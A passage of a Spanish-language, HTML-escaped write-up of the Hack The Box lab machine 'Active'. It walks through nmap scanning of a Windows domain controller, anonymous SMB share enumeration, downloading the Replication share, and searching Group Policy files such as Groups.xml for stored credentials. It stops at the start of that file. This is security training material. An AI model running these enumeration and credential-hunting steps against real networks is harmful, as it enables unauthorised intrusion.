-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.100
-PING 10.10.10.100 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.100&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.100: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;136 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.100 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 136.281/136.281/136.281/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.100 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-28 22:17 CST
-Initiating SYN Stealth Scan at 22:17         
-Scanning 10.10.10.100 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]        
-Discovered open port 445/tcp on 10.10.10.100  
-Discovered open port 139/tcp on 10.10.10.100  
-Discovered open port 135/tcp on 10.10.10.100  
-Discovered open port 53/tcp on 10.10.10.100 
-Discovered open port 5722/tcp on 10.10.10.100
-Discovered open port 464/tcp on 10.10.10.100  
-Discovered open port 49155/tcp on 10.10.10.100
-Discovered open port 49182/tcp on 10.10.10.100
-Discovered open port 49158/tcp on 10.10.10.100                                                                                   
-Discovered open port 49169/tcp on 10.10.10.100
-Discovered open port 636/tcp on 10.10.10.100  
-Discovered open port 49157/tcp on 10.10.10.100
-Discovered open port 9389/tcp on 10.10.10.100                                                                                    
-Discovered open port 88/tcp on 10.10.10.100                                                                                      
-Discovered open port 49152/tcp on 10.10.10.100
-Discovered open port 49154/tcp on 10.10.10.100  
-Discovered open port 49153/tcp on 10.10.10.100  
-Discovered open port 389/tcp on 10.10.10.100    
-Discovered open port 3269/tcp on 10.10.10.100   
-Discovered open port 49171/tcp on 10.10.10.100  
-Discovered open port 3268/tcp on 10.10.10.100   
-Discovered open port 593/tcp on 10.10.10.100    
-Completed SYN Stealth Scan at 22:18, 14.26s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.100               
-Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  
-Scanned at 2021-11-28 22:17:47 CST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;15s      
-Not shown: 65477 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 36 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
-PORT      STATE SERVICE          REASON
-53/tcp    open  domain           syn-ack ttl 127
-88/tcp    open  kerberos-sec     syn-ack ttl 127
-135/tcp   open  msrpc            syn-ack ttl 127
-139/tcp   open  netbios-ssn      syn-ack ttl 127
-389/tcp   open  ldap             syn-ack ttl 127
-445/tcp   open  microsoft-ds     syn-ack ttl 127
-464/tcp   open  kpasswd5         syn-ack ttl 127
-593/tcp   open  http-rpc-epmap   syn-ack ttl 127
-636/tcp   open  ldapssl          syn-ack ttl 127
-3268/tcp  open  globalcatLDAP    syn-ack ttl 127
-3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
-5722/tcp  open  msdfsr           syn-ack ttl 127
-9389/tcp  open  adws             syn-ack ttl 127
-49152/tcp open  unknown          syn-ack ttl 127
-49153/tcp open  unknown          syn-ack ttl 127
-49154/tcp open  unknown          syn-ack ttl 127
-49155/tcp open  unknown          syn-ack ttl 127
-49157/tcp open  unknown          syn-ack ttl 127
-49158/tcp open  unknown          syn-ack ttl 127
-49169/tcp open  unknown          syn-ack ttl 127
-49171/tcp open  unknown          syn-ack ttl 127
-49182/tcp open  unknown          syn-ack ttl 127
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;14.36 seconds
-           Raw packets sent: 69987 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.079MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 68046 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.722MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.100
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49169,4917
-       │ 1,49182
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p53&lt;/span&gt;,88,135,139,389,445,464,593,636,3268,3269,5722,9389,49152,49153,49154,49155,49157,49158,49169,49171,49182 10.10.10.100 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-28 22:22 CST
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.100
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Microsoft DNS 6.1.7601 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1DB15D39&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows Server 2008 R2 SP1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| dns-nsid: 
-|_  bind.version: Microsoft DNS 6.1.7601 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1DB15D39&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-88/tcp    open  tcpwrapped
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: active.htb, Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-445/tcp   open  microsoft-ds?
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  tcpwrapped
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: active.htb, Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-3269/tcp  open  tcpwrapped
-5722/tcp  open  msrpc         Microsoft Windows RPC
-9389/tcp  open  mc-nmf        .NET Message Framing
-49152/tcp open  msrpc         Microsoft Windows RPC
-49153/tcp open  msrpc         Microsoft Windows RPC
-49154/tcp open  msrpc         Microsoft Windows RPC
-49155/tcp open  msrpc         Microsoft Windows RPC
-49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49158/tcp open  msrpc         Microsoft Windows RPC
-49169/tcp open  msrpc         Microsoft Windows RPC
-49171/tcp open  msrpc         Microsoft Windows RPC
-49182/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: DC&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
-
-Host script results:
-|_clock-skew: 4m57s
-| smb2-security-mode: 
-|   2.1: 
-|_    Message signing enabled and required
-| smb2-time: 
-|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2021-11-29T04:28:39
-|_  start_date: 2021-11-29T04:26:46
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;74.86 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos abierto el puerto 445, por lo que podríamos tratar de ver recursos con una &lt;em&gt;Null session&lt;/em&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.10.100 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
-Anonymous login successful
-
-        Sharename       Type      Comment
-        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
-        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;         Disk      Remote Admin
-        C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;             Disk      Default share
-        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;           IPC       Remote IPC
-        NETLOGON        Disk      Logon server share 
-        Replication     Disk      
-        SYSVOL          Disk      Logon server share 
-        Users           Disk      
-SMB1 disabled &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; no workgroup available
-❯ smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.100
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
-        Disk                                                    Permissions     Comment
-        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
-        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 NO ACCESS       Remote Admin
-        C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
-        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                   NO ACCESS       Remote IPC
-        NETLOGON                                                NO ACCESS       Logon server share 
-        Replication                                             READ ONLY
-        SYSVOL                                                  NO ACCESS       Logon server share 
-        Users                                                   NO ACCESS
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Observamos que tenemos permisos de lectura bajo el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Replication&lt;/code&gt;, así que vamos a echarle un ojo. Como vemos que cuenta con múltiples directorios internos uno dentro de otro, mejor vamos descargarlos a nuestro equipo de atacante (&lt;strong&gt;Nota&lt;/strong&gt;: En este caso se descargan debido a que son relativamente pocos, en caso de que sean muchos, es recomendable crear una mountura).&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbclient //10.10.10.100/Replication &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
-Anonymous login successful
-Try &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt; to get a list of possible commands.
-smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; 
-smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                   D        0  Sat Jul 21 05:37:44 2018
-  ..                                  D        0  Sat Jul 21 05:37:44 2018
-  active.htb                          D        0  Sat Jul 21 05:37:44 2018
-
-                10459647 blocks of size 4096. 5728098 blocks available
-smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; recurse ON
-smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; prompt OFF
-smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; mget &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-getting file &lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;ctive.htb&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;olicies&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;PT.INI of size 23 as active.htb/Policies/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/GPT.INI &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 0.0 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-getting file &lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;ctive.htb&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;olicies&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;6AC1786C-016F-11D2-945F-00C04fB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;PT.INI of size 22 as active.htb/Policies/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;6AC1786C-016F-11D2-945F-00C04fB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/GPT.INI &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 0.0 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-getting file &lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;ctive.htb&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;olicies&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;roup Policy&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;PE.INI of size 119 as active.htb/Policies/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/Group Policy/GPE.INI &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.2 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 0.1 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-getting file &lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;ctive.htb&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;olicies&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;ACHINE&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;egistry.pol of size 2788 as active.htb/Policies/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/MACHINE/Registry.pol &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.0 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 1.3 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-getting file &lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;ctive.htb&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;olicies&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;ACHINE&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;references&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;roups&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;roups.xml of size 533 as active.htb/Policies/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/MACHINE/Preferences/Groups/Groups.xml &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.0 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 1.3 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-getting file &lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;ctive.htb&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;olicies&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;ACHINE&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows NT&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ecEdit&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;ptTmpl.inf of size 1098 as active.htb/Policies/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.0 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 1.4 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-getting file &lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;ctive.htb&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;olicies&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;6AC1786C-016F-11D2-945F-00C04fB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;ACHINE&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows NT&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ecEdit&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;ptTmpl.inf of size 3722 as active.htb/Policies/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;6AC1786C-016F-11D2-945F-00C04fB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6.7 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 2.1 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Una vez que nos hayamos descargado los recursos a nuestra máquina de atacante, vamos a echarles un ojo:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ tree
-&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-└── active.htb
-    ├── DfsrPrivate
-    │   ├── ConflictAndDeleted
-    │   ├── Deleted
-    │   └── Installing
-    ├── Policies
-    │   ├── &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-    │   │   ├── GPT.INI
-    │   │   ├── Group Policy
-    │   │   │   └── GPE.INI
-    │   │   ├── MACHINE
-    │   │   │   ├── Microsoft
-    │   │   │   │   └── Windows NT
-    │   │   │   │       └── SecEdit
-    │   │   │   │           └── GptTmpl.inf
-    │   │   │   ├── Preferences
-    │   │   │   │   └── Groups
-    │   │   │   │       └── Groups.xml
-    │   │   │   └── Registry.pol
-    │   │   └── USER
-    │   └── &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;6AC1786C-016F-11D2-945F-00C04fB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-    │       ├── GPT.INI
-    │       ├── MACHINE
-    │       │   └── Microsoft
-    │       │       └── Windows NT
-    │       │           └── SecEdit
-    │       │               └── GptTmpl.inf
-    │       └── USER
-    └── scripts
-
-22 directories, 7 files
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Dentro de lo observamos, tenemos un recurso interesante en el cual podríamos encontrar credenciales &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Groups.xml&lt;/code&gt; asociado al SYSVOL. SYSVOL es el recurso compartido de todo el dominio en Active Directory al que todos los usuarios autenticados tienen acceso de lectura. SYSVOL contiene scripts de inicio de sesión, datos de políticas de grupo y otros datos de todo el dominio que deben estar disponibles en cualquier lugar donde haya un controlador de dominio (ya que SYSVOL se sincroniza y comparte automáticamente entre todos los controladores de dominio). Para mayor información, podríamos consultar el siguiente recurso: &lt;a href=&quot;https://adsecurity.org/?p=2288&quot;&gt;adsecurity&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Vamos a tratar de visualizar el contenido de dicho archivo:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;active.htb/Policies/&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;se&quot;&gt;\}&lt;/span&gt;/MACHINE/Preferences/Groups/Groups.xml
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: active.htb/Policies/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/MACHINE/Preferences/Groups/Groups.xml
-───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ &amp;lt;?xml &lt;span class=&quot;nv&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;?&amp;gt;
